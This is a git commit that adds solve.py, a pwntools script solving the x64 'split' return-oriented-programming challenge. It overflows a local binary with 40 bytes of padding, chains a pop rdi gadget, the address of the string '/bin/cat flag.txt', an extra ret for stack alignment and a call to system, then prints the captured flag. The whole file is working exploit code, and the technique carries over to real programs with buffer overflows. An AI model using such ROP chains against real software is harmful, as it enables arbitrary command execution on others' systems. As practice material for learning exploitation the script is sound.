8bc0393391d47a5680cd837c1381db1008514e3f
0xSoEasY <julien@rouillier.fr>
2021-06-20 22:17:38 +0200

    Solving 1-split in x64 (+ MOVAPS issue)

---
+++ x64/1-split/solve.py
@@ -0,0 +1,24 @@
+from pwn import *
+
+BINARY = "./split"
+ELF = ELF(BINARY)
+
+context.os = "linux"
+context.arch = "amd64"
+context.binary = BINARY
+
+p = process(BINARY)
+
+rop = b"A" * 40
+rop += p64(0x4007c3) # pop rdi ; ret
+rop += p64(0x601060) # address of "/bin/cat flag.txt"
+rop += p64(0x40053e) # ret --> MOVAPS issue
+rop += p64(ELF.symbols["system"])
+
+log.success(f"ROP chain : {rop}")
+
+p.recv()
+p.sendline(rop)
+
+flag = p.recvall().split(b'\n')#[-2]
+log.success(f"FLAG : {flag}")
